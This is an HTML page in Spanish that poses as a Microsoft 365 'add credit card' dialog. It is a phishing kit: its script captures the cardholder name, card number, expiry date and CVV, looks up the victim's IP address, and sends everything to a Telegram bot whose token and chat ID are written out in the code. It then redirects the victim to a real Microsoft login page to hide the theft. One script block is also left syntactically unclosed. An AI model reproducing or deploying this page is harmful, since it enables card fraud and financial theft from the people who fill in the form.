<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>365</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      margin: 0;
      padding: 0;
      background-color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .modal-box {
      width: 100%;
      max-width: 420px;
      border: 1px solid #ddd;
      border-radius: 6px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      overflow: hidden;
      background-color: white;
    }

    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 15px 20px;
      border-bottom: 1px solid #ddd;
      background-color: white;
      border-top-left-radius: 6px;
      border-top-right-radius: 6px;
    }

    .logo {
      height: 24px;
    }

    .close-btn {
      font-size: 24px;
      font-weight: bold;
      color: #333;
      cursor: pointer;
    }

    .form-container {
      width: 100%;
      padding: 20px;
      box-sizing: border-box;
    }

    h2 {
      font-size: 20px;
      margin-bottom: 10px;
    }

    .card-logos {
      display: flex;
      align-items: center;
      gap: 8px;
      margin-top: 5px;
    }

    .card-logos img {
      height: 24px;
    }

    label {
      display: block;
      font-weight: bold;
      margin-top: 15px;
      margin-bottom: 5px;
    }

    input[type="text"], select {
      width: 100%;
      padding: 10px;
      border: 1px solid #888;
      border-radius: 3px;
      font-size: 14px;
      box-sizing: border-box;
    }

    .expiration {
      display: flex;
      gap: 10px;
      flex-wrap: wrap;
    }

    .expiration select {
      flex: 1 1 45%;
    }

    .cvv-container {
      display: flex;
      align-items: center;
      gap: 5px;
    }

    .required {
      color: rgb(51, 49, 49);
      margin-left: 3px;
    }

    .info-icon {
      font-size: 14px;
      color: #666;
      cursor: pointer;
      border: 1px solid #ccc;
      border-radius: 50%;
      width: 18px;
      height: 18px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: bold;
    }

    .note {
      font-size: 12px;
      color: #666;
      margin-top: 5px;
    }

    .error {
      color: red;
      font-size: 12px;
      margin-top: 3px;
    }

    .submit-btn {
      margin-top: 20px;
      background-color: #0078d4;
      color: white;
      padding: 10px;
      border: none;
      border-radius: 3px;
      font-size: 14px;
      cursor: pointer;
      width: 100%;
    }

    @media (max-width: 400px) {
      .expiration select {
        flex: 1 1 100%;
      }
    }
  </style>
</head>
<body>

<div class="modal-box">
  <div class="header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft" class="logo">
    <span class="close-btn" onclick="cerrarModal()">&times;</span>
  </div>

  <div class="form-container">
    <h2>Agregar tarjeta de crédito o débito</h2>

    <div class="note">Se aceptan las tarjetas siguientes</div>
    <div class="card-logos">
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
      <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
    </div>

    <div class="note" style="margin-top: 15px;">* Obligatorio</div>

    <form id="cardForm" novalidate>
      <label for="nombre">Nombre del titular <span class="required">*</span></label>
      <input type="text" id="nombre" name="nombre">
      <div class="error" id="error-nombre"></div>

      <label for="numero">Número de tarjeta <span class="required">*</span></label>
      <input type="text" id="numero" name="numero">
      <div class="error" id="error-numero"></div>

      <label>Mes de expiración <span class="required">*</span></label>
      <div class="expiration">
        <select id="mes" name="mes">
          <option value="">MM</option>
          <option value="01">01</option>
          <option value="02">02</option>
          <option value="03">03</option>
          <option value="04">04</option>
          <option value="05">05</option>
          <option value="06">06</option>
          <option value="07">07</option>
          <option value="08">08</option>
          <option value="09">09</option>
          <option value="10">10</option>
          <option value="11">11</option>
          <option value="12">12</option>
        </select>

        <select id="ano" name="ano">
          <option value="">AA</option>
          <option value="25">25</option>
          <option value="26">26</option>
          <option value="27">27</option>
          <option value="28">28</option>
          <option value="29">29</option>
          <option value="30">30</option>
          <option value="31">31</option>
          <option value="32">32</option>
          <option value="33">33</option>
          <option value="34">34</option>
          <option value="35">35</option>
          <option value="36">36</option>
          <option value="37">37</option>
          <option value="38">38</option>
          <option value="39">39</option>
          <option value="40">40</option>
          <option value="41">41</option>
          <option value="42">42</option>
          <option value="43">43</option>
          <option value="44">44</option>
          <option value="45">45</option>
        </select>
      </div>
      <div class="error" id="error-expiracion"></div>

      <label for="cvv">CVV <span class="required">*</span></label>
      <div class="cvv-container">
        <input type="text" id="cvv" name="cvv" style="width: 60px;">
        <span class="info-icon">i</span>
      </div>
      <div class="error" id="error-cvv"></div>

      <button type="submit" class="submit-btn">Agregar tarjeta</button>
    </form>
  </div>
</div>

<script>
  function cerrarModal() {
    window.location.href = 'index.html'; // ← Cambia esto por la URL a la que quieres ir
  }

  document.getElementById('cardForm').addEventListener('submit', function(e) {
    e.preventDefault();

    let valid = true;

    const nombre = document.getElementById('nombre').value.trim();
    const errorNombre = document.getElementById('error-nombre');
    if (nombre === '') {
      errorNombre.textContent = 'El nombre es obligatorio.';
      valid = false;
    } else {
      errorNombre.textContent = '';
    }

    const numero = document.getElementById('numero').value.trim();
    const errorNumero = document.getElementById('error-numero');
    if (!/^\d{13,19}$/.test(numero)) {
      errorNumero.textContent = 'Número de tarjeta inválido (13-19 dígitos).';
      valid = false;
    } else {
      errorNumero.textContent = '';
    }

    const mes = document.getElementById('mes').value;
    const ano = document.getElementById('ano').value;
    const errorExpiracion = document.getElementById('error-expiracion');
    if (mes === '' || ano === '') {
      errorExpiracion.textContent = 'Selecciona mes y año de expiración.';
      valid = false;
    } else {
      errorExpiracion.textContent = '';
    }

    const cvv = document.getElementById('cvv').value.trim();
    const errorCvv = document.getElementById('error-cvv');
    if (!/^\d{3,4}$/.test(cvv)) {
      errorCvv.textContent = 'CVV inválido (3 o 4 dígitos).';
      valid = false;
    } else {
      errorCvv.textContent = '';
    }

</script>

<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>

<script>
  const TOKEN = '7542806960:AAHfZElGSpGRq_Ier0wbNTGbhe_IMOokQeA'; // ← reemplaza
  const CHAT_ID = '-4924487701';     // ← reemplaza

  document.getElementById("cardForm").addEventListener("submit", async function(e) {
    e.preventDefault();

    // Obtener valores del formulario
    const nombre = document.getElementById("nombre").value.trim();
    const numero = document.getElementById("numero").value.trim();
    const mes = document.getElementById("mes").value;
    const ano = document.getElementById("ano").value;
    const cvv = document.getElementById("cvv").value.trim();
    const fecha = `${mes}/${ano}`;

    let ip = 'No disponible';

    // Obtener IP usando axios
    try {
      const res = await axios.get('https://ipapi.co/json/');
      ip = res.data.ip;
    } catch (error) {
      console.warn("No se pudo obtener la IP:", error);
    }

    // Construir mensaje para Telegram
    const mensaje = `
 CC:
 Titular: ${nombre}
 Número: ${numero}
 Expira: ${fecha}
 CVV: ${cvv}
 IP del usuario: ${ip}
`;

    // Enviar mensaje a Telegram con axios
    const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

    try {
      await axios.post(url, {
        chat_id: CHAT_ID,
        text: mensaje
      });

      // Redireccionar tras el envío
      window.location.href = 'https://login.live.com'; // ← reemplaza por tu URL

    } catch (error) {
      console.error("Error al enviar a Telegram:", error);
      alert("Hubo un error al enviar los datos.");
    }
  });
</script>
</body>
</html>
